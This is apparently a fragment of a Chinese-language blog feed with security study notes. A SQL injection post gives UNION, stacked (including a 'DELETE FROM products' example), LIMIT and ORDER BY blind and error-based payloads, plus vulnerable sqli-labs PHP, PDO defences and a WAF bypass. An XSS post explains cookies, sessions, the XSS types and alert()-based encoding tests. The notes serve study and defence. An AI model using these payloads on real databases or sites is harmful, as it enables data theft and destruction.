class=\"line\">?user_id=-1/**/Union/**/SeLect/**/1,flag,3,4/**/from/**/users/**/limit/**/0,1&amp;user.id=11</span><br><span class=\"line\">?user_id=-1/**/Union/**/SeLect/**/1,schema_name from information_schema.schemata,3,4/**/from/**/users/**/limit/**/0,1&amp;user.id=11</span><br></pre></td></tr></table></figure>\n<h5 id=\"堆叠注入\"><a class=\"markdownIt-Anchor\" href=\"#堆叠注入\">#</a> 堆叠注入</h5>\n<p>Stacked injections (堆叠注入) 从名词的含义就可以看到应该是一堆 sql 语句 (多条) 一起执行。而在真实的运用中也是这样的，我们知道在 mysql 中，主要是命令行中，每一条语句结尾加；表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。</p>\n<p>堆叠注入原理</p>\n<p>在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在；结束一个 sql 语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于 union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products 服务器端生成的 sql 语句为： Select * from products where productid=1;DELETE FROM products 当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>\n<p>堆叠注入的使用条件十分有限，其可能受到 API 或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条 sql 语句时才能够使用，利用 mysqli_multi_query () 函数就支持多条 sql 语句同时执行，但实际情况中，如 PHP 为了防止 sql 注入机制，往往使用调用数据库的函数是 mysqli_ query () 函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限.</p>\n<p>以 sqllab less-38 举例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class=\"line\">/* execute multi query */</span><br><span class=\"line\">if (mysqli_multi_query($con1, $sql))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    /* store first result set */</span><br><span class=\"line\">    if ($result = mysqli_store_result($con1))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if($row = mysqli_fetch_row($result))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            echo &#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;;\t</span><br><span class=\"line\">            printf(&quot;Your Username is : %s&quot;, $row[1]);</span><br><span class=\"line\">            echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">            printf(&quot;Your Password is : %s&quot;, $row[2]);</span><br><span class=\"line\">            echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">            echo &quot;&lt;/font&gt;&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">//            mysqli_free_result($result);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        /* print divider */</span><br><span class=\"line\">    if (mysqli_more_results($con1))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">            //printf(&quot;-----------------\\n&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">     //while (mysqli_next_result($con1));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else </span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">\techo &#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class=\"line\">\tprint_r(mysqli_error($con1));</span><br><span class=\"line\">\techo &quot;&lt;/font&gt;&quot;;  </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">/* close connection */</span><br><span class=\"line\">mysqli_close($con1);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>堆叠注入部分参考链接：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYmFja2xpb24vcC85NzIxNjg3Lmh0bWw=\">https://www.cnblogs.com/backlion/p/9721687.html</span></p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220321165558549.png\" alt=\"image-20220321165558549\" style=\"zoom:67%;\" />\n<h5 id=\"update-insert语句中注入\"><a class=\"markdownIt-Anchor\" href=\"#update-insert语句中注入\">#</a> update /insert 语句中注入</h5>\n<p>sqllab pass-17</p>\n<p>数据外带</p>\n<p>floor 报错注入</p>\n<p><strong>注意：update 语句中使用 updatexml 和 extractvalue 报错注入时 update 不会执行，因为 xpath 报错导致程序退出</strong></p>\n<h5 id=\"limit中注入\"><a class=\"markdownIt-Anchor\" href=\"#limit中注入\">#</a> limit 中注入</h5>\n<p>只适用于 mysql 版本 &lt; 5.5</p>\n<p>使用存储过程</p>\n<p>为什么要用存储过程？<br>\n①将重复性很高的一些操作，封装到一个存储过程中，简化了对这些 SQL 的调用</p>\n<p>②批量处理：SQL + 循环，减少流量</p>\n<p>③统一接口，确保数据的安全</p>\n<p>使用存储过程：</p>\n<p>procedure analyse (1,2) 报错在第一个参数上</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure>\n<p>时间盲注时但存储过程无法使用 sleep，无法盲注，使用 benchmark 代替 sleep</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br></pre></td></tr></table></figure>\n<h5 id=\"order-by注入\"><a class=\"markdownIt-Anchor\" href=\"#order-by注入\">#</a> order by 注入</h5>\n<p>order by 是 mysql 中对查询数据进行排序的方法， 使用示例</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> 表名 <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> 列名(或者数字) <span class=\"keyword\">asc</span>;  #升序(默认升序)</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> 表名 <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> 列名(或者数字) <span class=\"keyword\">desc</span>;  #降序</span><br></pre></td></tr></table></figure>\n<p>这里的重点在于 order by 后既可以填列名或者是一个数字。举个例子： id 是 user 表的第一列的列名，那么如果想根据 id 来排序，有两种写法:</p>\n<p>因此这也就是我们为什么通过 order by 判断列数，我们会把第 x 当做 order by 的条件，如果没有 x 则报错</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> id;</span><br><span class=\"line\">selecr <span class=\"operator\">*</span> <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> <span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n<p>基于 if 盲注：</p>\n<p>需要知道列名</p>\n<p>order by 的列不同，返回的页面当然也是不同的，所以就可以根据排序的列不同来盲注。</p>\n<p>这里如果使用数字代替列名是不行的，因为 if 语句返回的是字符类型，不是整型。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">order by if(1=1,id,username);</span><br><span class=\"line\">order by if(表达式,1,(select id from information_schema.tables))</span><br></pre></td></tr></table></figure>\n<p>如果表达式为 false 时，sql 语句会报 ERROR 1242 (21000): Subquery returns more than 1 row 的错误，导致查询内容为空，如果表达式为 true 是，则会返回正常的页面</p>\n<p>基于时间盲注</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">order by if(1=1,1,sleep(1))</span><br></pre></td></tr></table></figure>\n<p>基于 rand () 盲</p>\n<p>可以看到当 rand () 为 true 和 false 时，排序结果是不同的，所以就可以使用 rand () 函数进行盲注了。 rand (true) | rand (false)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">order by rand(ascii(mid((select database()),1,1))&gt;96)</span><br></pre></td></tr></table></figure>\n<p>基于报错注入：</p>\n<p>updatexml 和 extravalue</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from ha order by updatexml(1,if(1=1,1,user()),1);#查询正常</span><br><span class=\"line\">select * from ha order by updatexml(1,if(1=2,1,user()),1);#查询报错</span><br></pre></td></tr></table></figure>\n<p>order by 注入的实例</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql = &#x27;select * from admin where username=&#x27;&quot;.$username.&quot;&#x27;&#x27;;</span><br><span class=\"line\">$result = mysql_query($sql);</span><br><span class=\"line\">$row = mysql_fetch_array($result);</span><br><span class=\"line\">if(isset($row)&amp;&amp;row[&#x27;username&#x27;]!=&quot;admin&quot;)&#123;</span><br><span class=\"line\">\t$hit=&quot;username error!&quot;;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">\tif ($row[&#x27;password&#x27;] === $password)&#123;</span><br><span class=\"line\">\t\t$hit=&quot;&quot;;</span><br><span class=\"line\">\t&#125;else&#123;</span><br><span class=\"line\">\t\t$hit=&quot;password error!&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">             </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username=admin&#x27; union 1,2,&#x27;字符串&#x27; order by 3</span><br></pre></td></tr></table></figure>\n<p>或者一般存在的注入点为：可控制的位置在 <code>order by</code>  子句后，如下 order 参数可控</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;select * from goods order by $_GET[&#x27;order&#x27;]&quot;</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaWNlei9wL015c3FsLU9yZGVyLUJ5LUluamVjdGlvbi1TdW1tYXJ5Lmh0bWw=\">Mysql Order By 注入总结 - 艾斯泽 - 博客园 (cnblogs.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NjI3Nzg1L2FydGljbGUvZGV0YWlscy8xMTk0MTQwMzI=\">sql 注入之 order by 注入_夜影_321 的博客 - CSDN 博客_orderby sql 注入</span></p>\n<h3 id=\"mysql注入防御\"><a class=\"markdownIt-Anchor\" href=\"#mysql注入防御\">#</a> mysql 注入防御</h3>\n<h4 id=\"通过函数过滤\"><a class=\"markdownIt-Anchor\" href=\"#通过函数过滤\">#</a> 通过函数过滤</h4>\n<p><code>$id = addslashed($id);</code>  使用 \\ 转义字符，比如’ &quot; \\ NULL</p>\n<p>注意 GPG 开关开启时会默认转义所有输入，如果这时才使用此函数会造成双重转义使转义失效</p>\n<p><code>$id = addcslashed($id); </code>  使用 c 语言风格转义函数 \\0 \\r 等</p>\n<h4 id=\"降权\"><a class=\"markdownIt-Anchor\" href=\"#降权\">#</a> 降权</h4>\n<p>给每个数据库设置单独的管理员，不使用 root，sa 等高权限用户</p>\n<h4 id=\"使用pdo\"><a class=\"markdownIt-Anchor\" href=\"#使用pdo\">#</a> 使用 PDO</h4>\n<p>预处理语句可以把它看作是想要运行的 SQL 的一种编译过的模板，它可以使用变量参数进行定制。</p>\n<p>查询仅需解析（或预处理）一次，但可以用相同或不同的参数执行多次。当查询准备好后，数据库将分析、编译和优化执行该查询的计划。</p>\n<p>提供给预处理语句的参数不需要用引号括起来，驱动程序会自动处理。如果应用程序只使用预处理语句，可以确保不会发生 SQL 注入。</p>\n<p>预处理语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$pdo = new PDO(&quot;mysql:host=127.0.0.1;dbname=test;charset=utf8&quot;, &quot;root&quot;,&quot;root123&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$st = $pdo-&gt;prepare(&quot;select * from users where id =?&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$id = $_GET[&#x27;id&#x27;];</span><br><span class=\"line\">$st-&gt;bindParam(1, $id);</span><br><span class=\"line\">$st-&gt;execute();</span><br><span class=\"line\">$ret = $st-&gt;fetchAll();</span><br><span class=\"line\">print_r($ret);</span><br></pre></td></tr></table></figure>\n<p>这与我们平时使用 mysql_real_escape_string 将字符串进行转义，再拼接成 SQL 语句没有差别，只是由 PDO 本地驱动完成转义的（EMULATE_PREPARES）</p>\n<p>PDO 有一项参数，名为 PDO::ATTR_EMULATE_PREPARES ，表示是否使用 PHP 本地模拟 prepare，此项参数默认 true, 我们改为 false 后</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$pdo = new PDO(&quot;mysql:host=127.0.0.1;dbname=test;charset=utf8&quot;, &quot;root&quot;,&quot;root123&quot;);</span><br><span class=\"line\">$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);</span><br><span class=\"line\"></span><br><span class=\"line\">$st = $pdo-&gt;prepare(&quot;select * from users where id =?&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$id = $_GET[&#x27;id&#x27;];</span><br><span class=\"line\">$st-&gt;bindParam(1, $id);</span><br><span class=\"line\">$st-&gt;execute();</span><br><span class=\"line\">$ret = $st-&gt;fetchAll();</span><br><span class=\"line\">print_r($ret);</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbGVlemh4aW5nL3AvNTI4MjQzNy5odG1s\">PDO 防 sql 注入原理分析 - leezhxing - 博客园 (cnblogs.com)</span></p>\n<h3 id=\"绕过waf\"><a class=\"markdownIt-Anchor\" href=\"#绕过waf\">#</a> 绕过 waf</h3>\n<p>1. 过滤，</p>\n<p>通过 join 绕过，将查询结果当做一张表，将多张表使用 join 连接</p>\n<p>select 1,2,3 union select * from (select version()) a join  (select user()) b join  (select database()) c --+;</p>\n",
            "tags": [
                "SQL injection"
            ]
        },
        {
            "id": "http://example.com/2022/02/17/XSS/",
            "url": "http://example.com/2022/02/17/XSS/",
            "title": "XSS",
            "date_published": "2022-02-17T05:38:45.000Z",
            "content_html": "<h1 id=\"xss\"><a class=\"markdownIt-Anchor\" href=\"#xss\">#</a> XSS</h1>\n<h2 id=\"session-cookie\"><a class=\"markdownIt-Anchor\" href=\"#session-cookie\">#</a> session || cookie</h2>\n<p>1.Cookie 的工作原理<br>\n（1）浏览器端第一次发送请求到服务器端</p>\n<p>（2）服务器端创建 Cookie，该 Cookie 中包含用户的信息，然后将该 Cookie 发送到浏览器端</p>\n<p>（3）浏览器端再次访问服务器端时会携带服务器端创建的 Cookie</p>\n<p>（4）服务器端通过 Cookie 中携带的数据区分不同的用户</p>\n<p>————————————————</p>\n<p>2.Session 的工作原理</p>\n<p>（1）浏览器端第一次发送请求到服务器端，服务器端创建一个 Session，同时会创建一个特殊的 Cookie（name 为 JSESSIONID 的固定值，value 为 session 对象的 ID），然后将该 Cookie 发送至浏览器端</p>\n<p>（2）浏览器端发送第 N（N&gt;1）次请求到服务器端，浏览器端访问服务器端时就会携带该 name 为 JSESSIONID 的 Cookie 对象</p>\n<p>（3）服务器端根据 name 为 JSESSIONID 的 Cookie 的 value (sessionId), 去查询 Session 对象，从而区分不同用户。</p>\n<p>name 为 JSESSIONID 的 Cookie 不存在（关闭或更换浏览器），返回 1 中重新去创建 Session 与特殊的 Cookie</p>\n<p>name 为 JSESSIONID 的 Cookie 存在，根据 value 中的 SessionId 去寻找 session 对象</p>\n<p>value 为 SessionId 不存在 **（Session 对象默认存活 30 分钟）**，返回 1 中重新去创建 Session 与特殊的 Cookie</p>\n<p>value 为 SessionId 存在，返回 session 对象</p>\n<p>————————————————</p>\n<p>(1) cookie 数据存放在客户的浏览器上，session 数据放在服务器上，但是服务端的 session 的实现对客户端的 cookie 有依赖关系的；</p>\n<p>(2) cookie 不是很安全，别人可以分析存放在本地的 COOKIE 并进行 COOKIE 欺骗，如果主要考虑到安全应当使用 session</p>\n<p>(3) session 会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能，如果主要考虑到减轻服务器性能方面，应当使用 COOKIE</p>\n<p>(4) 单个 cookie 在客户端的限制是 3K，就是说一个站点在客户端存放的 COOKIE 不能 3K。</p>\n<p>(5) 所以：将登陆信息等重要信息存放为 SESSION; 其他信息如果需要保留，可以放在 COOKIE 中</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NoZW4xMzMzMzMzNjY3Ny9hcnRpY2xlL2RldGFpbHMvMTAwOTM5MDMw\">(62 条消息) Cookie 和 Session 的区别（面试必备）_秋风不识路的博客 - CSDN 博客_cookie 与 session 区别</span></p>\n<h2 id=\"1反射型xss\"><a class=\"markdownIt-Anchor\" href=\"#1反射型xss\">#</a> 1. 反射型 xss</h2>\n<p>反射型 XSS 是非持久性、参数型的跨站脚本。反射型 XSS 的 JS 代码在 Web 应用的参数（变量）中，如搜 索框的反射型 XSS。在搜索框中，提交 PoC [scriptalert (/xss/)/script]，点击搜索，即可触发反射型 XSS。 注意到，我们提交的 poc 会出现在 search.php 页面的 keywords 参数中。</p>\n<h2 id=\"2存储型xss\"><a class=\"markdownIt-Anchor\" href=\"#2存储型xss\">#</a> 2. 存储型 XSS</h2>\n<p>存储型 XSS 是持久性跨站脚本。持久性体现在 XSS 代码不是在某个参数（变量）中，而是写进数据库或 文件等可以永久保存数据的介质中。存储型 XSS 通常发生在留言板等地方。我们在留言板位置留言，将 恶意代码写进数据库中。此时，我们只完成了第一步，将恶意代码写入数据库。因为 XSS 使用的 JS 代 码，JS 代码的运行环境是浏览器，所以需要浏览器从服务器载入恶意的 XSS 代码，才能真正触发 XSS。 此时，需要我们模拟网站后台管理员的身份，查看留言。</p>\n<h2 id=\"3基于dom的\"><a class=\"markdownIt-Anchor\" href=\"#3基于dom的\">#</a> 3. 基于 DOM 的</h2>\n<p>XSS DOM XSS 比较特殊。owasp 关于 DOM 型号 XSS 的定义是基于 DOM 的 XSS 是一种 XSS 攻击，其中攻击 的 payload 由于修改受害者浏览器页面的 DOM 树而执行的。其特殊的地方就是 payload 在浏览器本地修 改 DOM 树而执行， 并不会传到服务器上，这也就使得 DOM XSS 比较难以检测。</p>\n<p>URL 的每一个参数、URL 本身、表单、搜索框、常见业务场景 重灾区：评论区、留言区、个人信息、订单信息等 针对型：站内信、网页即时通讯、私信、意见反馈 存在风险：搜索框、当前目录、图片属性等</p>\n<h2 id=\"浏览器解析机制\"><a class=\"markdownIt-Anchor\" href=\"#浏览器解析机制\">#</a> 浏览器解析机制</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>.&lt;a href=<span class=\"string\">&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;</span>&gt;aaa&lt;/a&gt;</span><br><span class=\"line\"><span class=\"comment\">// 解析不了,href后的编码会使用实体编码解析，不能解析url编码</span></span><br><span class=\"line\">http:<span class=\"comment\">//127.0.0.1:18888/javascript:alert%281%29</span></span><br><span class=\"line\">URL 编码 <span class=\"string\">&quot;javascript:alert(1)&quot;</span></span><br><span class=\"line\"><span class=\"number\">2</span>.&lt;a href=<span class=\"string\">&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;</span>&gt;</span><br><span class=\"line\">HTML字符实体编码 <span class=\"string\">&quot;javascript&quot;</span> 和 URL 编码 <span class=\"string\">&quot;alert(2)&quot;</span></span><br><span class=\"line\">  JavaScript支持Unicode，hex，utf-<span class=\"number\">16</span></span><br><span class=\"line\"><span class=\"number\">3</span>.&lt;a href=<span class=\"string\">&quot;javascript%3aalert(3)&quot;</span>&gt;&lt;/a&gt;</span><br><span class=\"line\">URL 编码 <span class=\"string\">&quot;:&quot;</span></span><br><span class=\"line\">  js不能编码符号</span><br><span class=\"line\"><span class=\"number\">4</span>.&lt;div&gt;&amp;<span class=\"comment\">#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;</span></span><br><span class=\"line\">HTML字符实体编码 &lt; 和 &gt;</span><br><span class=\"line\">  会解析但不会执行</span><br><span class=\"line\"><span class=\"number\">5</span>.&lt;textarea&gt;&amp;<span class=\"comment\">#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;</span></span><br><span class=\"line\">HTML字符实体编码 &lt; 和 &gt;</span><br><span class=\"line\">    会解析但不会执行</span><br><span class=\"line\"><span class=\"number\">6</span>.&lt;textarea&gt;&lt;script&gt;<span class=\"title function_ invoke__\">alert</span>(<span class=\"number\">6</span>)&lt;/script&gt;&lt;/textarea&gt;</span><br><span class=\"line\">    会解析但不会执行</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang=&quot;en&quot;&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class=\"line\">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class=\"line\">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class=\"line\">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">    &lt;!-- 不能解析 --&gt;</span><br><span class=\"line\">    &lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;aaa&lt;/a&gt;&lt;br&gt;   </span><br><span class=\"line\">    &lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt;</span><br><span class=\"line\">    &lt;!-- js中符号不能编码 --&gt;</span><br><span class=\"line\">    &lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- html解析完不能执行，&lt;不能编码，浏览器中直接显示img标签 --&gt;</span><br><span class=\"line\">    &lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- textarea中的标签可以被解码，但不能被解析，&lt;script&gt;alert(5)&lt;/script&gt; --&gt;</span><br><span class=\"line\">    &lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- textarea中所有标签都不能被解析 --&gt;</span><br><span class=\"line\">    &lt;button onclick=&quot;confirm(&#x27;8\\u0027);&quot;&gt;Button&lt;/button&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- 不能编码符号 --&gt;</span><br><span class=\"line\">    &lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;</span><br><span class=\"line\">    &lt;!-- 原始字符块只能容纳文本，会被解析为文本 --&gt;</span><br><span class=\"line\">    &lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029&lt;/script&gt;</span><br><span class=\"line\">    &lt;!-- 不能对()及其里面的内容编码 --&gt;</span><br><span class=\"line\">    &lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)&lt;/script&gt;</span><br><span class=\"line\">    &lt;!-- 同理 --&gt;</span><br><span class=\"line\">    &lt;script&gt;alert(&#x27;14\\u000a)&lt;/script&gt;</span><br><span class=\"line\">    &lt;!-- Unicode 编码换行符（0x0A）,但不会引起真正的换行 --&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span 